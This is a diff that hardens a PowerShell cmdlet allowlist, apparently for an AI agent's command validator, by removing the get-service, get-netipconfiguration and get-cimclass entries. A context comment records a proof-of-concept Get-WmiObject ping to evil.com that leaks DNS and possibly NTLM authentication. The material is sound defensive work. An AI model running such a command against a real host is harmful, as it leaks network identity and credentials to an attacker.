@@ -411,16 +411,6 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-IncludeUserName',
       ],
     },
-    'get-service': {
-      safeFlags: [
-        '-Name',
-        '-DisplayName',
-        '-DependentServices',
-        '-RequiredServices',
-        '-Include',
-        '-Exclude',
-      ],
-    },
     'get-computerinfo': {
       allowAllFlags: true,
     },
@@ -596,9 +586,6 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-Type',
       ],
     },
-    'get-netipconfiguration': {
-      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
-    },
     'get-netroute': {
       safeFlags: [
         '-InterfaceIndex',
@@ -666,16 +653,6 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
     //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
     // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
-    // get-cimclass stays — only lists class metadata, no instance enumeration.
-    'get-cimclass': {
-      safeFlags: [
-        '-ClassName',
-        '-Namespace',
-        '-MethodName',
-        '-PropertyName',
-        '-QualifierName',
-      ],
-    },
 
     // =========================================================================
     // Git - uses shared external command validation with per-flag checking
